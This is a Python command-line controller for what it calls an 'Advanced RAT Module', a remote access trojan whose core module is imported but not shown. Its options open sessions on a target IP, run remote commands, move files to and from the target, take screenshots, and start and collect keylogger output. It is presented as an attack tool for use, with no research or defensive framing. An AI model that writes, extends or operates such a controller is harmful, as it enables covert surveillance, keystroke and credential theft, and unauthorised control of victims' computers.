#!/usr/bin/env python3
"""
Advanced RAT Module CLI
Command Line Interface for Advanced RAT Module
"""

import asyncio
import argparse
import json
import sys
from advanced_rat_module import AdvancedRATModule

async def main():
    parser = argparse.ArgumentParser(description='Advanced RAT Module CLI')
    parser.add_argument('--create-session', action='store_true', help='Create RAT session')
    parser.add_argument('--target-ip', help='Target IP address')
    parser.add_argument('--target-port', type=int, default=5555, help='Target port')
    parser.add_argument('--tool', default='auto', help='RAT tool to use')
    parser.add_argument('--execute-command', action='store_true', help='Execute command')
    parser.add_argument('--session-id', help='Session ID')
    parser.add_argument('--command', help='Command to execute')
    parser.add_argument('--parameters', help='Command parameters (JSON)')
    parser.add_argument('--get-sessions', action='store_true', help='Get all sessions')
    parser.add_argument('--transfer-file', action='store_true', help='Transfer file')
    parser.add_argument('--local-path', help='Local file path')
    parser.add_argument('--remote-path', help='Remote file path')
    parser.add_argument('--direction', choices=['upload', 'download'], default='upload', help='Transfer direction')
    parser.add_argument('--screenshot', action='store_true', help='Take screenshot')
    parser.add_argument('--keylogger', choices=['start', 'stop', 'get_data'], help='Keylogger action')
    parser.add_argument('--duration', type=int, default=300, help='Keylogger duration')
    parser.add_argument('--close-session', action='store_true', help='Close session')
    parser.add_argument('--statistics', action='store_true', help='Get statistics')
    
    args = parser.parse_args()
    
    rat_module = AdvancedRATModule()
    
    try:
        if args.create_session:
            if not args.target_ip:
                print(json.dumps({"success": False, "error": "Target IP is required"}))
                return
            
            result = await rat_module.create_rat_session(
                target_ip=args.target_ip,
                target_port=args.target_port,
                tool=args.tool
            )
            print(json.dumps(result))
            
        elif args.execute_command:
            if not args.session_id or not args.command:
                print(json.dumps({"success": False, "error": "Session ID and command are required"}))
                return
            
            parameters = {}
            if args.parameters:
                try:
                    parameters = json.loads(args.parameters)
                except json.JSONDecodeError:
                    print(json.dumps({"success": False, "error": "Invalid parameters JSON"}))
                    return
            
            result = await rat_module.execute_command(
                session_id=args.session_id,
                command=args.command,
                parameters=parameters
            )
            print(json.dumps(result))
            
        elif args.get_sessions:
            result = rat_module.get_all_sessions()
            print(json.dumps(result))
            
        elif args.transfer_file:
            if not args.session_id or not args.local_path or not args.remote_path:
                print(json.dumps({"success": False, "error": "Session ID, local path, and remote path are required"}))
                return
            
            result = await rat_module.transfer_file(
                session_id=args.session_id,
                local_path=args.local_path,
                remote_path=args.remote_path,
                direction=args.direction
            )
            print(json.dumps(result))
            
        elif args.screenshot:
            if not args.session_id:
                print(json.dumps({"success": False, "error": "Session ID is required"}))
                return
            
            result = await rat_module.take_screenshot(args.session_id)
            print(json.dumps(result))
            
        elif args.keylogger:
            if not args.session_id:
                print(json.dumps({"success": False, "error": "Session ID is required"}))
                return
            
            if args.keylogger == 'start':
                result = await rat_module.start_keylogger(args.session_id, args.duration)
            elif args.keylogger == 'stop':
                result = await rat_module.stop_keylogger(args.session_id)
            elif args.keylogger == 'get_data':
                result = await rat_module.get_keylogger_data(args.session_id)
            else:
                print(json.dumps({"success": False, "error": "Invalid keylogger action"}))
                return
            
            print(json.dumps(result))
            
        elif args.close_session:
            if not args.session_id:
                print(json.dumps({"success": False, "error": "Session ID is required"}))
                return
            
            result = await rat_module.close_session(args.session_id)
            print(json.dumps(result))
            
        elif args.statistics:
            result = rat_module.get_statistics()
            print(json.dumps(result))
            
        else:
            parser.print_help()
            
    except Exception as e:
        print(json.dumps({"success": False, "error": str(e)}))

if __name__ == "__main__":
    asyncio.run(main())